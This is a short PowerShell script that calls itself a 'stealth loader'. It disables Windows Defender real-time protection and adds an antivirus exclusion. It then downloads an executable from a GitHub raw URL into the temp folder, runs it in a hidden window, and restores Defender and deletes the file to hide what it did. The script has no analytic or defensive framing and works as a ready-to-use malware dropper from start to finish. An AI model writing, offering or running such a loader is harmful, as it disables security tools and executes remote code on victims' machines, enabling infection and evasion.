Write-Host "======================================"
Write-Host "       STEALTH LOADER ACTIVATED"
Write-Host "   PowerShell logic is running..."
Write-Host "======================================"

Start-Sleep -Seconds 2

$exeUrl = "https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
$exePath = "$env:TEMP\CAXVN.exe"

Write-Host "Disabling Windows Defender Real-Time Protection..."
Set-MpPreference -DisableRealtimeMonitoring $true

Write-Host "Adding EXE path to Defender exclusion..."
Add-MpPreference -ExclusionPath $exePath

Write-Host "Downloading EXE..."
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

Write-Host "Running EXE silently..."
Start-Process -FilePath $exePath -WindowStyle Hidden -Wait

Write-Host "Removing EXE from Defender exclusion..."
Remove-MpPreference -ExclusionPath $exePath

Write-Host "Re-enabling Windows Defender Real-Time Protection..."
Set-MpPreference -DisableRealtimeMonitoring $false

Write-Host "Deleting EXE..."
Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue

Write-Host "All done. Closing in 3 seconds..."
Start-Sleep -Seconds 3
